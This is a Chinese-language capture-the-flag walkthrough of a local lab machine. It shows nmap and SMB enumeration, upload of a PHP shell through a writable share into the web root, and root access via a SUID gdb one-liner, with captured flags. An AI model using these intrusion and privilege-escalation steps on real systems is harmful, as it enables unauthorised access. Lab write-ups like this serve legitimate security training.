### 端口扫描

```bash
nmap -sT --min-rate 10000 -p- 192.168.56.113
```

```
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-10-13 01:33 EDT
Nmap scan report for 192.168.56.113
Host is up (0.00072s latency).
Not shown: 65531 closed tcp ports (conn-refused)
PORT    STATE SERVICE
22/tcp  open  ssh
80/tcp  open  http
139/tcp open  netbios-ssn
445/tcp open  microsoft-ds
MAC Address: 08:00:27:AF:CC:26 (Oracle VirtualBox virtual NIC)
```



```bash
nmap -sT -sC -sV -O -p22,80,139,445 192.168.56.113
```

```
PORT    STATE SERVICE     VERSION
22/tcp  open  ssh         OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey: 
|   2048 b7:e6:01:b5:f9:06:a1:ea:40:04:29:44:f4:df:22:a1 (RSA)
|   256 fb:16:94:df:93:89:c7:56:85:84:22:9e:a0:be:7c:95 (ECDSA)
|_  256 45:2e:fb:87:04:eb:d1:8b:92:6f:6a:ea:5a:a2:a1:1c (ED25519)
80/tcp  open  http        Apache httpd 2.4.38 ((Debian))
|_http-server-header: Apache/2.4.38 (Debian)
|_http-title: Apache2 Debian Default Page: It works
139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp open  netbios-ssn Samba smbd 4.9.5-Debian (workgroup: WORKGROUP)
MAC Address: 08:00:27:AF:CC:26 (Oracle VirtualBox virtual NIC)
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running: Linux 4.X|5.X
OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5
OS details: Linux 4.15 - 5.8
Network Distance: 1 hop
Service Info: Host: CONNECTION; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
| smb-os-discovery: 
|   OS: Windows 6.1 (Samba 4.9.5-Debian)
|   Computer name: connection
|   NetBIOS computer name: CONNECTION\x00
|   Domain name: \x00
|   FQDN: connection
|_  System time: 2024-10-13T01:34:58-04:00
|_clock-skew: mean: 1h19m58s, deviation: 2h18m33s, median: -1s
| smb2-time: 
|   date: 2024-10-13T05:34:58
|_  start_date: N/A
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required
|_nbstat: NetBIOS name: CONNECTION, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
```

### 目录扫描

无收获

### SMB服务渗透

```bash
smbmap -H 192.168.56.113
```

```
[*] Detected 1 hosts serving SMB
[*] Established 1 SMB session(s)                                
                                                                                                    
[+] IP: 192.168.56.113:445      Name: 192.168.56.113            Status: Authenticated
        Disk                                                    Permissions     Comment
        ----                                                    -----------     -------
        share                                                   READ ONLY
        print$                                                  NO ACCESS       Printer Drivers
        IPC$                                                    NO ACCESS       IPC Service (Private Share for uploading files)
```

`share`文件只读

```bash
smbclient //192.168.56.113/share
smbclient -N \\\\192.168.56.113\\share
```

需要对`\`进行转义

进入到web目录。利用`put`上传shell

```
smb: \html\> put 1.php
```

![image-20241013143506298](https://dabai1-1316520326.cos.ap-shanghai.myqcloud.com/img/image-20241013143506298.png)

### 提权

user‘s flag

```bash
(remote) www-data@connection:/home/connection$ cat local.txt                                             3f491443a2a6aa82bc86a3cda8c39617
```

```bash
(remote) www-data@connection:/home/connection$ find / -type f -perm -4000 2>/dev/null
/usr/lib/eject/dmcrypt-get-device
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/openssh/ssh-keysign
/usr/bin/newgrp
/usr/bin/umount
/usr/bin/su
/usr/bin/passwd
/usr/bin/gdb
/usr/bin/chsh
/usr/bin/chfn
/usr/bin/mount
/usr/bin/gpasswd
```

#### gdb提权

![image-20241013143723876](https://dabai1-1316520326.cos.ap-shanghai.myqcloud.com/img/image-20241013143723876.png)

```bash
 gdb -nx -ex 'python import os; os.execl("/bin/bash", "bash", "-p")' -ex quit
```

```bash
(remote) root@connection:/root# cat proof.txt 
a7c6ea4931ab86fb54c5400204474a39
```

